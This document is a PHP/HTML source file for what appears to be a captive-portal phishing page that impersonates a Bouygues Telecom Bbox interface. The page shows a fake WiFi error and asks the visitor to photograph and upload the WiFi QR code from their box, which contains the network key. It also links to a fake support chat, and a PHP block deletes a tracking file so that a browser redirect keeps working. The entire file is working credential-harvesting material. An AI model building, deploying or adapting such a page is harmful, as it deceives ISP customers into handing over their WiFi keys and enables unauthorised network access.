<?php
// on enlève le fichier vu.txt pour ne pas empécher la redirection sur chrome en cas de nouvelle connexion d'un android browser app.
  
$file_pointer = "vu.txt"; 
  
// Use unlink() function to delete a file 
if (!unlink($file_pointer)) { 
    echo ("$file_pointer cannot be deleted due to an error"); 
} 
else { 
    echo (""); 
} 
?> 
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>Bienvenue sur votre interface Bouygues</title>
<link href="/bboxcss/centrage.css" rel="stylesheet" type="text/css" />
<script type="text/javascript" src="js/jquery-1.11.3-jquery.min.js"></script>
<script type="text/javascript" src="script.js"></script>
<IMG class="displayed" src="bbox2.png">
</head>
<br>
<br>
<br>
<br>
<p><font color="teal">Code erreur 109: une erreur est survenue sur le réseau wifi.</p>
<br>
<br>
<body>
<p><font color="teal">Veuillez vous connecter en prenant en photo le QR code qui s'affiche sur votre box.<b>Cette méthode permet de connecter l'ensemble de vos équipements sans avoir à taper la clé de sécurité wifi pour chacun d'eux.</b>Le QR code wifi s'affiche via le menu wifi de votre Bbox.
<br>
<br>		
	<br>
	<center><IMG class="displayed" src="bbox4.png"></center>
	<br>
	<br>
<p>Appuyez sur le bouton <b>Choisir un fichier</b> ci-dessous pour prendre photo le QR code <b>en évitant les mouvements.</b>Une fois la photo prise, vous devez appuyer sur <b>Upload.</b>Si ça ne fonctionne pas et que votre navigateur internet n'est pas compatible, ne fermez pas cette fenêtre et utilisez l'appareil photo de votre mobile pour prendre en photo le QR code.Ensuite, revenez à cette fenêtre et choisissez l'image correspondante dans votre galerie puis valider en appuyant sur <b>Upload.</b></p>
<div class="container">
<div class="row">
<div class="col-md-8">
<form id="form" action="ajaxupload.php" method="post" enctype="multipart/form-data">
<input id="uploadImage" type="file" name="image" />
<div id="preview"><img src="filed.png" /></div><br>
<input class="btn btn-success" type="submit" value="Upload">
</form>
<div id="err"></div>
<hr>
<p>Besoin d'une aide supplémentaire ? un technicien peut vous venir en aide: </strong> <a href="/shout/bboxtchat.php" target="_blank"><u>aide en ligne</u> ...</a>
</br>
</br>
</body>
</html>
